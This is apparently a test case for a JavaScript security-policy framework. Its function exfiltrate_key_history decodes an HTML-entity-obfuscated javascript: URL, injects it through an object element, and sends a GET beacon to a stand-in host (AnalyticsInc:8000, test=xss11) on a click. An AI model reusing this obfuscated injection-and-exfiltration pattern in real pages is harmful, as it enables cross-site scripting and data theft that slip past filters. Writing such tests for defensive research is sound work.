
JAM.startProfile('load');
introspect(JAMScript.introspectors.processAll) {
function exfiltrate_key_history() {
  var enc = "&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#70&#117&#110&#99&#116&#105&#111&#110&#40&#39&#120&#109&#108&#104&#116&#116&#112&#61&#110&#101&#119&#32&#88&#77&#76&#72&#116&#116&#112&#82&#101&#113&#117&#101&#115&#116&#40&#41&#59&#120&#109&#108&#104&#116&#116&#112&#46&#111&#112&#101&#110&#40&#34&#71&#69&#84&#34&#44&#34&#104&#116&#116&#112&#58&#47&#47&#65&#110&#97&#108&#121&#116&#105&#99&#115&#73&#110&#99&#58&#56&#48&#48&#48&#47&#115&#117&#98&#109&#105&#115&#115&#105&#111&#110&#46&#104&#116&#109&#108&#63&#116&#101&#115&#116&#61&#120&#115&#115&#49&#49&#34&#44&#116&#114&#117&#101&#41&#59&#120&#109&#108&#104&#116&#116&#112&#46&#115&#101&#110&#100&#40&#110&#117&#108&#108&#41&#59&#39&#41&#40&#41";
  var bounce = document.createElement("textarea");
  bounce.innerHTML = enc;
  var script = document.createElement("object");
  script.data = bounce.value;
  var v2 = document.getElementsByTagName("body");
  var v0 = v2[0];
  v0.appendChild(script);
  return
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history;

}

JAM.stopProfile('load');
